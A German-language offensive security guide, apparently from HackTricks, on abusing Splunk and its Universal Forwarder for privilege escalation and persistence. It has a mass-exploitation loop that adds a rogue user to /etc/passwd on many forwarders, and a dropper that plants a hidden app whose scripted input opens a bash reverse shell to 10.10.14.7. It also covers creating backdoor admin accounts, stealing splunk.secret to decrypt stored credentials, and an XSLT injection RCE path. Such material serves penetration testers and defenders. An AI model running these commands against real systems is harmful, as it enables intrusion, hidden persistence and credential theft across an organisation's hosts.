# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Wenn du bei der **Enumeration** einer Maschine **intern** oder **extern** **Splunk running** vorfindest (üblicherweise **8000** für die Web-UI und **8089** für die Management-API), können gültige Zugangsdaten häufig durch die Installation von Apps, scripted inputs oder Management-Aktionen in **code execution** umgewandelt werden.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Wenn Splunk als **root** läuft, führt dies häufig unmittelbar zu einer **privilege escalation**.<sup>[[1]](#references)</sup>

Wenn du nur die generische Remote-Angriffsfläche, Enumeration oder den RCE-Pfad über das Hochladen von Apps benötigst, siehe:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Wenn du **bereits root** bist und der Splunk-Dienst nicht ausschließlich auf localhost lauscht, kannst du außerdem **Splunk password hashes** stehlen, **encrypted secrets** wiederherstellen oder eine **malicious app** pushen, um lokal oder über mehrere Forwarder hinweg Persistence aufrechtzuerhalten.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interessante lokale Dateien

Wenn du auf einem Host mit Splunk oder Splunk Universal Forwarder landest, sind dies normalerweise die interessantesten Pfade:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Wichtige Artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: lokale Splunk-Benutzer und Passwort-Hashes.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: von Splunk verwendeter Schlüssel zur Verschlüsselung von Secrets, die in mehreren `.conf`-Dateien gespeichert sind.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initiale Admin-Bootstrap-Datei; nützlich bei Gold Images und Provisioning-Fehlern. Sie wird ignoriert, wenn `etc/passwd` bereits vorhanden ist.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: Ort, an dem scripted inputs häufig aktiviert werden.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** oder **`$SPLUNK_HOME/etc/apps/`**: gute Orte, um eine persistente App zu verstecken oder zu überprüfen, was bereits verteilt wird.<sup>[[11]](#references)</sup>

## Zusammenfassung des Splunk Universal Forwarder Agent Exploits

Weitere Details finden Sie unter [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist lediglich eine Zusammenfassung.<sup>[[1]](#references)</sup>

**Übersicht des Exploits:**
Ein Exploit gegen den Splunk Universal Forwarder (UF) ermöglicht es Angreifern mit dem **Agent-Passwort**, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, wodurch potenziell ein großer Teil der Umgebung kompromittiert werden kann.<sup>[[1]](#references)</sup>

**Warum er funktioniert:**

- Der Management-Service des UF ist häufig auf **TCP 8089** erreichbar.<sup>[[6]](#references)</sup>
- Angreifer können sich bei der API authentifizieren und den Forwarder anweisen, ein **bösartiges App-Bundle** zu installieren.<sup>[[1]](#references)[[5]](#references)</sup>
- Dieselbe Primitive kann lokal für **LPE** oder remote für **RCE** verwendet werden.<sup>[[5]](#references)</sup>
- Öffentlich verfügbare Tools wie **SplunkWhisperer2** erstellen das App-Bundle automatisch und können Payloads für Linux-Ziele anpassen.<sup>[[5]](#references)</sup>

**Übliche Möglichkeiten, das Passwort wiederzuerlangen:**

- Klartext-Credentials in Dokumentationen, Skripten, Shares oder Deployment-Automatisierung.<sup>[[1]](#references)</sup>
- Passwort-Hashes in `$SPLUNK_HOME/etc/passwd`, gefolgt von Offline-Cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Gold Images oder Provisioning-Überreste wie `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Auswirkungen:**

- Codeausführung auf SYSTEM-/Root-Ebene auf jedem kompromittierten Host.<sup>[[1]](#references)</sup>
- Bereitstellung persistenter Apps, Backdoors oder Ransomware.<sup>[[1]](#references)</sup>
- Deaktivierung oder Manipulation der Telemetrie, bevor die Daten weitergeleitet werden.<sup>[[1]](#references)</sup>

**Beispielbefehl für die Ausnutzung:**

Der ursprüngliche Bericht demonstriert die folgende Schleife zum Senden eines Payloads an mehrere Forwarder.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Nutzbare öffentliche Exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence über Scripted Inputs oder Malicious Apps

Wenn du **Schreibzugriff auf das Dateisystem** als `root`/`splunk` oder authentifizierten Zugriff zum Installieren von Apps hast, besteht ein sehr zuverlässiger Persistence-Mechanismus darin, eine **benutzerdefinierte App** mit einem **scripted input** abzulegen.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Die eigene Dokumentation von Splunk erwartet, dass sich scripted inputs innerhalb eines App-Verzeichnisses befinden und über `inputs.conf` aktiviert werden.<sup>[[10]](#references)</sup>

Typischer Aufbau:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Schneller Linux-Dropper (unter Verwendung dieses dokumentierten App-Layouts):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notizen:

- Derselbe Trick funktioniert auch beim **Universal Forwarder** mit `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Angreifer tarnen sich häufig, indem sie ein legitimes Add-on modifizieren, anstatt eine offensichtlich bösartige App zu erstellen.<sup>[[2]](#references)</sup>
- Auf einem **deployment server** führt das Platzieren einer bösartigen App in `deployment-apps/` zu **fleet-wide persistence**, da Forwarder aktualisierte Apps regelmäßig abfragen und herunterladen und häufig neu gestartet werden, um sie anzuwenden.<sup>[[11]](#references)[[12]](#references)</sup>

## Diebstahl von Zugangsdaten und Übernahme des Administratorkontos

Wenn du Splunks lokale Dateien lesen kannst, gibt es normalerweise zwei gute Ziele: **Splunk-Adminzugriff** wiederherstellen und **verschlüsselte Service-Zugangsdaten** wiederherstellen.<sup>[[8]](#references)</sup>

### Passwort-Hashes und lokale Benutzer

Splunk speichert lokale Authentifizierungsdaten in `etc/passwd`. Je nach Deployment kann das Cracken dieser Datei gültige Zugangsdaten für die Weboberfläche und die Management-API liefern.<sup>[[1]](#references)[[7]](#references)</sup>

Wenn du bereits über gültige **Admin**-Zugangsdaten verfügst und Splunk sein **native** Authentifizierungs-Backend verwendet, kann die CLI selbst für Persistence genutzt werden.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` und verschlüsselte Werte

Splunk verwendet `etc/auth/splunk.secret`, um sensible Werte zu schützen, die in mehreren Konfigurationsdateien gespeichert sind. Wenn du sowohl das **secret** als auch die relevanten **`.conf`-Dateien** stehlen kannst, lassen sich häufig folgende Werte wiederherstellen oder wiederverwenden:<sup>[[8]](#references)</sup>

- gemeinsame Secrets von Forwarder/Indexer wie `pass4SymmKey`
- Passwörter für TLS-Private-Keys wie `sslPassword`
- LDAP-Bind-Zugangsdaten wie `bindDNPassword`

Dies kann **lateral movement** ermöglichen, selbst wenn das Splunk-Adminpasswort selbst nicht crackbar ist.<sup>[[8]](#references)</sup>

### Missbrauch von `user-seed.conf`

`user-seed.conf` wird nur beim ersten Start oder wenn `etc/passwd` nicht existiert verwendet. Dadurch ist die Datei auf einem laufenden System weniger nützlich, aber besonders interessant bei:<sup>[[9]](#references)</sup>

- kompromittierten Installationsvorlagen
- Container-Images
- Workflows zur unbeaufsichtigten Bereitstellung
- Appliances, bei denen Splunk automatisch neu initialisiert wird

In diesen Fällen verschafft dir das Platzieren eines mit `splunk hash-passwd` generierten `HASHED_PASSWORD` eine unauffällige Möglichkeit, nach einer erneuten Bereitstellung wieder Adminzugriff zu erlangen.<sup>[[9]](#references)</sup>

## Missbrauch von Splunk-Abfragen

Weitere Details findest du unter [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Eine nützliche aktuelle Technik besteht darin, **vom Benutzer bereitgestelltes XSLT** in verwundbaren Splunk-Enterprise-Versionen zu missbrauchen, um ein authentifiziertes Konto mit niedrigen Berechtigungen in **OS command execution** als Benutzer `splunk` umzuwandeln.<sup>[[3]](#references)[[4]](#references)</sup>

Ablauf auf hoher Ebene:<sup>[[3]](#references)[[4]](#references)</sup>

1. Bei Splunk authentifizieren.
2. Eine schädliche **XSL**-Datei über die Preview-/Upload-Funktion hochladen.
3. Splunk dazu bringen, Suchergebnisse mit diesem hochgeladenen Stylesheet aus dem **dispatch**-Verzeichnis zu rendern.
4. Die XSLT-Payload verwenden, um eine Datei zu schreiben oder über Splunks Search-Pipeline eine Ausführung auszulösen, beispielsweise durch das Erreichen interner Funktionen wie `runshellscript`.

Die wichtige offensive Erkenntnis ist, dass dieser Weg **post-auth RCE ohne app upload** ermöglicht. Unter Linux erhältst du normalerweise Zugriff auf das Konto **`splunk`**, was dennoch wertvoll ist, weil dieser Benutzer häufig den Anwendungsbaum besitzt, Secrets lesen kann und persistente Apps platzieren kann, die den Verlust der Shell überstehen.<sup>[[3]](#references)[[4]](#references)</sup>

Ein beim Exploitation-Prozess verwendeter repräsentativer Pfad ist:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Wenn Splunk mit zu vielen Berechtigungen ausgeführt wird oder der Benutzer `splunk` Zugriff auf gefährliche Skripte, beschreibbare Service-Units oder unsichere `sudo`-Regeln hat, entsteht daraus eine saubere **LPE**-Kette.

## References

- [1] [Splunk Forwarders für RCE und Persistence missbrauchen](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Vorsicht vor TraitorWare: Splunk für Persistence verwenden](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Analyse von CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Standardwerte ändern](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Sichere Passwörter auf mehreren Servern bereitstellen](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Einen scripted input einrichten](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Deployment-Apps erstellen](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [So erfolgen Deployment-Updates](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Benutzer mit der CLI konfigurieren](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
